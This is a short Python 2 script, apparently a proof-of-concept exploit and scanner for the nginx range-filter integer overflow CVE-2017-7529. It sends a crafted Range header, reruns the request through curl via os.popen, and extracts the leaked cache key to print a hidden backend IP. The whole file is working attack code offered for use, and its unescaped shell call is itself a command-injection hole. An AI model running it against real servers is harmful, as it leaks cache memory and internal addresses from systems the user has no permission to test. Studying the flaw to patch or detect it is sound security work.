#!/usr/bin/env python
#-*- coding:utf-8 -*-
# nginx 整数溢出 CVE-2017-7529

import os
import re
import sys
import urllib2

def cve_request(url):
    headers = urllib2.urlopen(url, timeout=10)
    # 假如获取不到大小
    try:
        response_len = headers.headers["Content-Length"]
    except:
        response_len = len(headers.read())

    request = urllib2.Request(url)
    request.add_header("Range", "bytes=-%d,-9223372036854%d" % (int(response_len) + 623, 776000 - (int(response_len) + 623)))
    # 生成命令
    command = "curl -i %s -r -%d,-9223372036854%d" % (url, (int(response_len) + 623), (776000 - (int(response_len) + 623)))
    try:
        cacheres = urllib2.urlopen(request, timeout=10)
        # 有些误报需要用条件来判断，
        if cacheres.code == 206 and "Content-Range" in cacheres.read(2048) and not 'IIS' in cacheres.headers['Server']:
            result = _ip(command)
            # 假如第一次请求，先生成缓存
            if "X-Proxy-Cache: MISS" in result:
                result = _ip(command)
            ip = re.findall("KEY:[\s](.*?)\s", result)
            if len(ip) > 0: 
                print "Ip:" + ip[0]
                print "Vuln:" + url 
    except Exception,e:
        print(e)

def _ip(command):
    try:
        result = os.popen(command).read()
        return result
    except Exception,e:
        pass

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print "%s url" % (sys.argv[0])
        print "eg: python %s http://127.0.0.1:8080/proxy/demo.png" % (sys.argv[0])
        sys.exit()
    url = sys.argv[1]
    cve_request(url)
